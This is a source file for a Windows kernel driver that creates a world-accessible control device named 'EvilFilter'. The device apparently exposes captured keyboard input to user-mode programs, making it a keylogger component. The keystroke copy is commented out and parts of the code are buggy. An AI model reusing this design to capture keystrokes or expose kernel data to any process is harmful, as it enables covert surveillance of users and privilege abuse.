#include <ntddk.h>
#include <wdf.h>
//#include <ntddkbd.h>   
#include <ControlDevice.h>


WDFDEVICE ControlDevice;
extern PKEYBOARD_INPUT_DATA keyboardBuffer;






VOID PrintPteData(PVOID VirtualAddress) {

	PVOID PDEaddress = (((ULONG)VirtualAddress >> 20) & (~0x3)) + 0xC0300000;
	PVOID PTEaddress = (((ULONG)VirtualAddress >> 10) & (~0x3)) + 0xC0000000;
	KdPrint((" PDE/PTE are [0x%lx] [0x%lx]\n", PDEaddress, PTEaddress));


//	PPTE ptr;
//	ptr = PDEaddr(VirtualAddress);
}

NTSTATUS CreateControlDevice(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath) {
	KdPrint(("CreateControlDevice IRQ Level [%u]", KeGetCurrentIrql()));

	NTSTATUS status;
	PWDFDEVICE_INIT ControlDeviceInit;
	WDF_OBJECT_ATTRIBUTES ControlDeviceAttributes;
	WDFDRIVER Driver;
	WDF_DRIVER_CONFIG       DriverConfig;
	WDF_IO_QUEUE_CONFIG         ioQueueConfig;
	WDFQUEUE                    queue;

	WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
	WDF_DRIVER_CONFIG_INIT(&DriverConfig, WDF_NO_EVENT_CALLBACK);

	//WDF_OBJECT_ATTRIBUTES_INIT(&Attributes);
	// TODO: Attributes.EvtCleanupCallback = EvtDriverContextCleanup;

	status = WdfDriverCreate(DriverObject, RegistryPath, &ControlDeviceAttributes, &DriverConfig, &Driver);

	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDriverCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDriverCreate Succeededx\n"));
	}

	ControlDeviceInit = WdfControlDeviceInitAllocate(Driver, &SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_RWX_RES_RWX);

	DECLARE_CONST_UNICODE_STRING(ntDeviceName, L"\\Device\\EvilFilter");
	DECLARE_CONST_UNICODE_STRING(symbolicLinkName, L"\\DosDevices\\EvilFilter");

	status = WdfDeviceInitAssignName(ControlDeviceInit, &ntDeviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceInitAssignName FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceInitAssignName Succeeded\n"));
	}

	//WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
	status = WdfDeviceCreate(&ControlDeviceInit, &ControlDeviceAttributes, &ControlDevice);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceCreate Succeeded\n"));
	}

	status = WdfDeviceCreateSymbolicLink(ControlDevice, &symbolicLinkName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceCreateSymbolicLink FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceCreateSymbolicLink Succeeded\n"));
	}

	WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchSequential);
	ioQueueConfig.DefaultQueue = TRUE;
	ioQueueConfig.EvtIoDefault = ReadKeyboardBuffer;
	status = WdfIoQueueCreate(ControlDevice, &ioQueueConfig, WDF_NO_OBJECT_ATTRIBUTES, &queue); // pointer to default queue

	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfIoQueueCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfIoQueueCreate Succeeded\n"));
	}
	WdfControlFinishInitializing(ControlDevice);

	KdPrint(("WdfControlFinishInitializing finished\n"));

	return status;
	// ControlDevice
}

_Use_decl_annotations_
VOID ReadKeyboardBuffer(_In_ WDFQUEUE Queue, _In_ WDFREQUEST Request) {

	UNREFERENCED_PARAMETER(Queue);

	KdPrint(("ReadKeyboardBuffer IRQ Level [%u]\n", KeGetCurrentIrql()));

	NTSTATUS                  status;
	//	WDF_REQUEST_PARAMETERS    params;
	WDFMEMORY memoryHandle;
	//PVOID memoryPointer;
	size_t Length;

	//WDF_REQUEST_PARAMETERS_INIT(&params);
	//WdfRequestGetParameters(Request, &params);
	if (keyboardBuffer) {



		/** /
		PVOID mappedBuffer = MmGetSystemAddressForMdlSafe(keyboardBuffer, NormalPagePriority);
		if (mappedBuffer) {

			KdPrint(("MmGetSystemAddressForMdlSafe success :-)))) \n"));
			PMDL mdl = NULL;
			WdfRequestRetrieveOutputWdmMdl(Request, &mdl);
			mdl->



		}
		else {

			KdPrint(("MmGetSystemAddressForMdlSafe FAILED :-( \n"));
		}
		/**/



		Length = sizeof(PKEYBOARD_INPUT_DATA); 

		WDF_OBJECT_ATTRIBUTES  attributes;
		WDF_OBJECT_ATTRIBUTES_INIT(&attributes);


		status = WdfRequestRetrieveOutputMemory(Request, &memoryHandle);
		//status = WdfMemoryCreate(&attributes, NonPagedPool, 0, Length, &memoryHandle, &memoryPointer);
		

		if (!NT_SUCCESS(status)) {
			KdPrint(("ReadKeyboardBuffer Could not create memory buffer 0x%x\n", status));
			WdfVerifierDbgBreakPoint();
			WdfRequestCompleteWithInformation(Request, status, 0L);
			return;
		}
		else {
			KdPrint(("ReadKeyboardBuffer memory buffer created.\n"));
		}

		PKEYBOARD_INPUT_DATA userKeyboardBuffer = (PKEYBOARD_INPUT_DATA)WdfMemoryGetBuffer(memoryHandle, NULL);
		if (!(userKeyboardBuffer)) {
			KdPrint(("ReadKeyboardBuffer WdfMemoryGetBuffer failed:\n"));
			WdfVerifierDbgBreakPoint();
			WdfRequestCompleteWithInformation(Request, status, 0L);
			return;
		}
		else {
			KdPrint(("ReadKeyboardBuffer WdfMemoryGetBuffer success. [0x%lx] [0x%lx]\n", userKeyboardBuffer, MmGetPhysicalAddress(userKeyboardBuffer)));
			KdPrint(("ReadKeyboardBuffer Make Code is [%c]:\n", userKeyboardBuffer->MakeCode));

			KdPrint(("ReadKeyboardBuffer KMDF keyboardBuffer "));
			PrintPteData(keyboardBuffer);
			KdPrint(("ReadKeyboardBuffer user keyboardBuffer "));
			PrintPteData(userKeyboardBuffer);
		}

		/** /


		status = WdfMemoryCopyFromBuffer(memoryHandle, 0, keyboardBuffer, Length);
		if (!NT_SUCCESS(status)) {
			KdPrint(("ReadKeyboardBuffer: WdfMemoryCopyFromBuffer failed 0x%x\n", status));
			WdfRequestComplete(Request, status);
			return;
		}
		else {
			KdPrint(("ReadKeyboardBuffer WdfMemoryCopyFromBuffer successful.\n"));
		}
		/**/
	}
	else {
		KdPrint(("keyboardBuffer not yet set....plz wait\n"));
		Length = 0;
		status = STATUS_RESOURCE_DATA_NOT_FOUND;
	}
	// Set transfer information
	WdfRequestSetInformation(Request, (ULONG_PTR)Length);
	WdfRequestComplete(Request, status);


}
